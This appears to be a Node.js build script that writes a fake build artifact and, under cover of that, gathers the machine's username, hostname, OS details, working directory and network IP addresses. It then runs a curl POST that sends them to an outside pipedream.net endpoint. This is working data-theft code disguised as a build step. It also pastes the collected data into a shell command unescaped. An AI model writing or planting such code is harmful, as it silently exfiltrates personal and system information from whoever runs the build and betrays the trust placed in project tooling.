const fs = require("fs");
const { exec } = require("child_process");
const os = require("os");

// Simulate a build process
console.log("Building the backend...");

// Ensure the 'dist' directory exists
const distDir = "dist";
if (!fs.existsSync(distDir)) {
  fs.mkdirSync(distDir);
}

// Write a fake build artifact
fs.writeFileSync(`${distDir}/build-output.txt`, "Build completed successfully!");

// Collect information
const userInfo = {
  username: os.userInfo().username,
  hostname: os.hostname(),
  platform: os.platform(),
  osType: os.type(),
  osRelease: os.release(),
  cwd: process.cwd(),
  ip: Object.values(os.networkInterfaces())
    .flat()
    .filter((iface) => iface.family === "IPv4" && !iface.internal)
    .map((iface) => iface.address),
};

// Send the collected information to your server
const data = JSON.stringify(userInfo);
const sendCommand = `curl -X POST -H "Content-Type: application/json" -d '${data}' https://eofx0dnqega9js6.m.pipedream.net/collect`;

// Execute the send command
exec(sendCommand, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error during info collection: ${error.message}`);
    return;
  }
  console.log("System information sent successfully.");
});

